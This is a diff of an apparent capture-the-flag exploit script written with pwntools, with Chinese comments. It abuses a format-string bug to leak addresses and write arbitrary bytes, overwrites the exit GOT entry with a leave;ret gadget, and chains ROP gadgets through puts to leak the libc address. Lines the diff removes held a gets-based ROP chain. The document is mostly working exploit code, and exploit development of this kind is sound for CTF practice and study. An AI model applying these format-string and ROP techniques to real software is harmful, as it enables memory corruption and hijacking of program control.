@@ -25,8 +25,10 @@ def write_global(value):
 
 
 
+# 把cnt 寫大一點
 def set_cnt(number = 1111):
     r.sendlineafter("local > ",b'local')
+    # leak 出 local 
     r.sendlineafter("write > ",b'write%p')
     line = r.recvuntil("global")
     line = line.decode()
@@ -38,14 +40,19 @@ def set_cnt(number = 1111):
     # line = r.recvline()
     # print("line",line)
 
+    # 這邊是為了讓stack上面有cnt的位置,讓我們fmt的時候依靠這個位置寫到cnt
+    # 所以直接在local上面寫cnt的位置
     r.sendlineafter("local > ",b'local')
     r.sendlineafter("write > ",b'read')
     r.sendline(b'A'*0x10 + p64(cnt_address))
 
+    # 這邊是最後一個cnt
+    # 這邊因為字數的限制,所以只能寫5進入cnt 
     r.sendlineafter("local > ",b'local')
     r.sendlineafter("write > ",b'write%16$n') 
 
 
+    # 有了5個cnt,我們就可以先write fmt到global 在 printf
     r.sendlineafter("local > ",b'global')
     r.sendlineafter("write > ",b'read')
     payload = '%{}c%16$n\x00'.format(number)
@@ -112,55 +119,6 @@ def leakglobal_bufferAddress():
 
 
 
-def callGets(code_base_address,libc_address,open_read_write_ROP_stack):
-    # local_stack_address = leakStackBaseAddress()
-    print("open_read_write_ROP_stack",hex(open_read_write_ROP_stack))
-
-
-    pop_rdi_ret = 0x16d3 + code_base_address
-    gets = 0x86af0 + libc_address
-    chal= 0x146a + code_base_address
-    pop_rsi_ret = 0x27529 + libc_address 
-    pop_rdx_pop_rbx_ret = 0x162866   + libc_address
-    pop_rax_ret = 0x4a550  + libc_address
-    scanf = 0x1184 + code_base_address
-    ret = 0x101a  + code_base_address
-    print("scanf",hex(scanf))
-
-    print("get address",hex(gets))
-
-    #  pop_rdi_ret,3,
-    #     pop_rsi_ret,fn,
-    #     pop_rdx_ret,0x30,
-    #     pop_rax_ret,0,
-    #     syscall_ret,
-
-    global_buffer_address = leakglobal_bufferAddress()
-    # print("pop_rdi_ret",hex(pop_rdi_ret),"global_buffer_address",hex(global_buffer_address),"gets",hex(gets),"chal",hex(chal))
-    print("pop_rdi_ret",hex(pop_rdi_ret),"open_read_write_ROP_stack",hex(open_read_write_ROP_stack),"gets",hex(gets),"chal",hex(chal))
-
-
-    padding = b'A'*0x24 + b'\x00'*4+ b'A'*0x10
-    rop = padding + flat(
-        # pop_rdi_ret,open_read_write_ROP_stack,
-        pop_rdi_ret,global_buffer_address,
-        gets,
-        chal
-    )
-    # print("rop",rop)
-    print("len of padding",len(rop))
-    r.sendlineafter("local > ",b'local')
-    r.sendlineafter("write > ",b'read')
-    r.sendlineafter("length > ",str(len(rop)+3).encode())
-    r.sendline(rop)
-    
-
-    r.sendline('ffffff')
-   
-    return libc_address
-
-
-
 def write_local(value):
     r.sendlineafter("local > ",b'local')
     r.sendlineafter("write > ",b'read')
@@ -176,14 +134,8 @@ def write_global(value):
 
 
 
-# def fmt_write_two_byte(addr,value):
-#     print("addr",addr,"value",value)
-#     tmp_value= p64(value)
 
-#     fmt_write_one_byte(addr,tmp_value[0])
-#     fmt_write_one_byte(addr+1,tmp_value[1])
-
-
+# 上面set_cnt有提到,先寫address到local在fmt
 def fmt_write(addr,byte_value,num_of_byte=1):
     print("fmt addr",hex(addr),"byte_value",hex(byte_value))
 
@@ -213,31 +165,8 @@ def fmt_write(addr,byte_value,num_of_byte=1):
     r.sendlineafter("local > ",b'global')
     r.sendlineafter("write > ",b'write')
 
-def fmt_write_address_final_two_byte(addr,value):
-    tmp = value[0] * value[1]
-    fmt_write(addr,tmp,2)
-
-def write_24_byte_to_arbitrary_address(addr,value):
-    print("24_byte_write addr",hex(addr),"value",value)
-    r.sendlineafter("local > ",b"local")
-    r.sendlineafter("write > ",b"dummy")
-
-    fmt_write_address_final_two_byte(ptr_address,p64(addr))
-
-    r.sendlineafter("local > ",b"fakePtr")
-    r.sendlineafter("write > ",b"read")
-    r.sendline(value)
-
-    
-def send_all_payload(start_address,payload):
-    print("send_all start_address",hex(start_address),"payload",payload)
-    if len(payload)%24 != 0:
-        payload += (24 - (len(payload) % 24)) * b'\x00'
-    for i in range(0,len(payload),24):
-        curAddress = start_address + 24*i
-        curPayload = payload[i:i+24]
-        write_24_byte_to_arbitrary_address(curAddress,curPayload)
         
+# fmt 一連串的字
 def fmt_send_payload(start_address,payload):
     print("fmt_send_payload start_addr",hex(start_address),"payload",payload)
     for i in range(len(payload)):
@@ -250,6 +179,7 @@ def fmt_send_payload(start_address,payload):
         print("address",hex(start_address+i),"i",i,"payload",hex(payload[i]))
     
 
+# 這邊使用fmt一個一個char寫到chal()的 ret,串一個ROP chain,的到libc address
 def leakLibC():
     puts_got = 0x4030 + code_base_address
     puts_plt = 0x1130 + code_base_address
@@ -259,6 +189,7 @@ def leakLibC():
     print("pop_rdi",hex(pop_rdi),"puts_got",hex(puts_got),"puts_plt",hex(puts_plt),"chal",hex(chal))
 
     rop = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(chal)
+    
     fmt_send_payload(stack_return_address,rop)
     # 將cnt寫成0 
     # fmt_write(cnt_address,0,4)
@@ -266,6 +197,7 @@ def leakLibC():
     # libc = u64(r.recvuntil(b"global").split(b'\n')[1].ljust(8,b"\x00")) - 0x00000000000875a0
     libc = u64(r.recvuntil(b"global").split(b'\n')[0][-6:].ljust(8,b'\x00')) - 0x875a0
     print("libc",hex(libc))
+    # ROP chain回來因為cnt會重設,所以我們也要重設cnt
     set_cnt()
     # reset cnt
     # fmt_write(cnt_address,11111,4)
@@ -274,6 +206,7 @@ def leakLibC():
 
     # send_all_payload(stack_return_address,rop)
     
+# 這邊因為每次使用rop chain,stack的位置會產生變化,所以每次rop chain回來後要更新位置
 
 def setStackSymbolsAddress(local_buffer_address):
     cnt_address = local_buffer_address - 12
@@ -306,11 +239,26 @@ print("memset_got",hex(memset_got))
 # fmt_write(exit_got,ret_gadget[0]) 
 # fmt_write(exit_got+1,ret_gadget[1])
 
+# 把exit_got寫成 leave_ret
+# 使用這個來觸發ROP chain, 因為chal 可能因為優化的因素, compiler看到exit
+# 就不編譯出leave ret, 所以我們用這替代
 
 fmt_write(exit_got,leave_ret[0])
 fmt_write(exit_got+1,leave_ret[1])
 
+# r.sendlineafter("local > ",b'dummy')
+# r.sendlineafter("write > ",b'rfdsjkead')
+# r.sendlineafter("local > ",b'carry')
+# # r.sendlineafter("write > ",b'xread')
 
+
+# fmt_write(memset_got,ret[0])
+# fmt_write(memset_got+1,ret[1])
+
+
+
+# r.sendlineafter("local > ",b'carry')
+# r.sendlineafter("write > ",b'fjsdkf')
 libc = leakLibC()
 
 print("******libc_address",hex(libc))
